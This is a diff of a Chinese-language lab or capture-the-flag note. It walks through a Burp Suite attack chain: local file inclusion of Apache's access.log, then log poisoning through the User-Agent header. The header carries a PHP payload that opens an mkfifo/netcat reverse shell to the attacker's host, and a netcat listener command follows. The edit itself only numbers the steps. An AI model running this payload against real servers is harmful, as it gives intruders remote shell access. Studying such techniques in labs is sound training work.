@@ -13,15 +13,15 @@
 ### 1. 关于BurpSuite 的 主动利用漏洞的中间人攻击技术流程
 ![夜深晨早打靶机](images/073102.png)
 Web 应用的密码重置功能，在浏览器的开发者工具中 (F12 → Network)获得密码后，登陆 开始拦截
-#### 获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log  Send，回应有User-Agent字段 ,Forward 
+#### [1]获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log  Send，回应有User-Agent字段 ,Forward 
 漏洞类型：本地文件包含（LFI）
-#### 点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改User-Agent:为
+#### [2]点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改User-Agent:为
 ```
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 主机IP不是目标IP 9090 >/tmp/f'); ?>
 ```
 Send,Forward 
 漏洞类型：日志注入（Log Poisoning,攻击载体：User-Agent header 注入 PHP payload
-#### 点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log 
+#### [3]点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log 
 ```
 nc -lvnp 9090
 ```
